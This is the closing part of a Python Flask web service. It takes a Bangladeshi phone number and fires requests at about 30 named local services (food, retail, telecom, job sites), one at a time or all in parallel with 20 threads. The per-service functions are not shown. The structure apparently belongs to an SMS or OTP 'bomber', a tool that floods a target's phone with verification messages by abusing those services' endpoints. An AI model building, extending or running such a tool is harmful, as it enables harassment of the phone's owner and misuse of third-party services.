    "kabbik":api_kabbik, "applink":api_applink,
    "priyos":api_priyos, "salextra":api_salextra, "drl":api_drl,
    "sundarban":api_sundarban, "kotha":api_kotha,
    "btcl":api_btcl, "btcl2":api_btcl2,
    "bdia":api_bdia, "pbs":api_pbs,
    "dressup":api_dressup, "aarong":api_aarong,
    "fabrilife":api_fabrilife, "garibook":api_garibook,
    "kfc":api_kfc, "foodaholic":api_foodaholic,
    "eatzy":api_eatzy, "eonbazar":api_eonbazar,
    "bdjobs":api_bdjobs, "sw":api_sw,
    "proiojon":api_proiojon, "beautybooth":api_beautybooth,
    "ultimatelife":api_ultimatelife,
    "binge":api_binge, "etestpaper":api_etestpaper,
    "chardike":api_chardike, "doctime":api_doctime,
    "gpweblogin":api_gpweblogin,
}

# ═══════════════════════════════════════════════════
#  ROUTES
# ═══════════════════════════════════════════════════
@app.route("/", methods=["GET"])
def index():
    phn = request.args.get("phone","").strip()
    api = request.args.get("api","").strip().lower()

    if not phn:
        return jsonify(footer({"status":False,"error":"phone required","example":"?phone=01XXXXXXXXX&api=all"}))
    if not valid_bd(phn):
        return jsonify(footer({"status":False,"error":"Invalid BD number (01XXXXXXXXX)"}))
    if not api:
        return jsonify(footer({"status":False,"error":"api required",
                               "modes":["all","single"],
                               "available":sorted(ROUTES.keys())}))

    # ---------- ALL MODE ----------
    if api == "all":
        start = time.time()
        results = {}
        # parallel execution
        with ThreadPoolExecutor(max_workers=20) as pool:
            futures = {pool.submit(fn, phn): name for name, fn in ROUTES.items()}
            for fut in as_completed(futures):
                name = futures[fut]
                try:    results[name] = fut.result()
                except Exception as e:
                    results[name] = {"error": str(e)[:150]}
        elapsed = round(time.time() - start, 2)
        return jsonify(footer({
            "status":True,
            "mode":"ALL",
            "phone":phn,
            "total_apis":len(ROUTES),
            "executed":len(results),
            "elapsed_sec":elapsed,
            "results":results
        }))

    # ---------- SINGLE MODE ----------
    if api not in ROUTES:
        return jsonify(footer({"status":False,"error":f"unknown api '{api}'",
                               "available":sorted(ROUTES.keys())}))
    try:
        result = ROUTES[api](phn)
        return jsonify(footer({"status":True,"mode":"single","api":api,"phone":phn,"response":result}))
    except Exception as e:
        return jsonify(footer({"status":False,"api":api,"error":str(e)}))

@app.route("/health", methods=["GET"])
def health():
    return jsonify(footer({"status":True,"message":"alive","total_apis":len(ROUTES)}))

@app.route("/apis", methods=["GET"])
def apis():
    return jsonify(footer({"status":True,"total":len(ROUTES),"list":sorted(ROUTES.keys())}))

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)

 
